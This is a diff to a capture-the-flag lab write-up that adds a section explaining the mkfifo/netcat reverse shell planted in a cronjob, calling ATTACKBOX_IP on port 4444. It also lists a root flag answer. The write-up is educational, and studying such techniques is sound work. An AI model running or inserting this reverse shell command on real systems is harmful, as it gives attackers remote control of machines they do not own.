@@ -252,7 +252,13 @@ There we go. It should be in .root.txt so let's run `cat .root.txt` real quick a
 **Question 8:**  
 **Answer: flag{63a9f0ea7bb98050796b649e85481845}**  
 
-#### Cronjob Detailed Breakdown
+#### Cronjob Detailed Breakdown  
+This section attempts to explain the command: `rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKBOX_IP 4444 >/tmp/f` that was used in the cronjob vulnerability for step 5.  
 
+The first part of the command `rm /tmp/f ;` removes the `/tmp/f` first in first out (FIFO) file. `mkfifo /tmp/f ;` creates it again. In essence, we are just making sure there isn't a previously defined pipe named "f" and are creating it.  
 
+The next part is `cat /tmp/f`. This is reading the `/tmp/f` file and sending it through the `|` operator or pipe operator to `/bin/sh -i 2>&1`. `-i` means interactive mode so `/bin/sh -i` runs the shell in interactive mode. `2>&1` redirects the user@host prompt from `stderr` to be sent over pipe. This is piped to `nc ATTACKBOX_IP 4444 >/tmp/f` so that the attacker machine at `ATTACKBOX_IP` can receive the user@host prompt while /bin/sh is executed server side. In other words, we will be able to send commands from our attacker machine to be executed on the target machine.  
 
+Note: I only understood this after a breakdown from [this post](https://askubuntu.com/questions/1127431/how-does-this-command-work-reverse-shell) and [this other post](https://unix.stackexchange.com/questions/406683/how-does-this-command-work-mkfifo-tmp-f-cat-tmp-f-bin-sh-i-21-nc-l). Many thanks to Sergiy Kolodyazhnyy on askubuntu.com and jdwolf on unix.stackexchange.com/for explaining it and The-null-Pointer- and Gowtham for posting their questions.  
+
+If you want more details, refer to the netcat [man page](https://linux.die.net/man/1/nc).
